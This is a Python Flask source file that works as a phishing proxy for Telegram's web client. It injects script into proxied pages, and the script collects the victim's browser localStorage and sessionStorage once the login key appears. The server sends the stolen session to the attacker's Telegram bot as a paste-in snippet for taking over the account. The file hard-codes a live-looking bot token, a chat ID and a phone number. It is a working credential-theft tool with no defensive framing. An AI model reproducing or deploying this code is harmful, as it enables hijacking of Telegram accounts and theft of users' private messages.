from flask import Flask, request, Response
import requests
import time

app = Flask(__name__)

# Base URL of the site you want to proxy
BASE_URL = 'https://web.telegram.org/k/'

# Your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
TELEGRAM_CHAT_ID = '-4580685528'
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    url = f"{BASE_URL}{path}"
    headers = {key: value for key, value in request.headers if key != 'Host'}

    if request.method == 'POST':
        response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'PUT':
        response = requests.put(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'DELETE':
        response = requests.delete(url, headers=headers, cookies=request.cookies)
    else:
        response = requests.get(url, headers=headers, cookies=request.cookies)

    injected_js = """
    <script>
        function sendStorageData() {
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            fetch('/store-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData
                }),
            });
        }
        const keyName = 'user_auth';
        const reloadLimit = 3;

        if (sessionStorage.getItem('reloadCount') === null) {
            sessionStorage.setItem('reloadCount', 0);
        } else {
            let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
            reloadCount += 1;
            sessionStorage.setItem('reloadCount', reloadCount);

            if (reloadCount >= reloadLimit) {
                console.log("Reload limit reached. Clearing storage...");
                localStorage.clear();
                sessionStorage.clear();
            }
        }
        window.onload = sendStorageData;

        setInterval(function() {
            const value = localStorage.getItem(keyName);
            if (value !== null) {
                console.log(`Key "${keyName}" exists with value:`, value);
                sendStorageData();
                window.location.reload();
            }
        }, 5000);
    </script>
    """

    if 'text/html' in response.headers.get('Content-Type', ''):
        content = response.text.replace('</body>', injected_js + '</body>')
    else:
        content = response.content

    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
    return Response(content, response.status_code, headers)

@app.route('/store-data', methods=['POST'])
def store_data():
    storage_data = request.json
    local_storage = storage_data.get('localStorage')
    session_storage = storage_data.get('sessionStorage')

    # Prepare the formatted HTML message
    message = format_message(local_storage)

    # Send the formatted text to Telegram
    send_text_to_telegram(message)

    return 'Data received', 200

def format_message(local_storage):
    # Example placeholders; customize this part based on actual localStorage data
    name = '?.eth'  # Replace this with the relevant localStorage key for the name if available
    phone = '+6285282631346'  # Replace this with the relevant localStorage key for the phone if available
    hit_id = '6717689117'  # Replace this with relevant data if needed

    # JavaScript code to be copied
    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";'%(local_storage)
    # Format the message using HTML
    message = f"""

<b>❓ How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)



<code>{copy_code}</code>
"""
    return message

def send_text_to_telegram(message):
    # Send the message text to the Telegram bot using HTML parsing
    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': TELEGRAM_CHAT_ID, 'text': message,"parse_mode":"html"} )

if __name__ == '__main__':
    app.run(debug=True, port=5000)
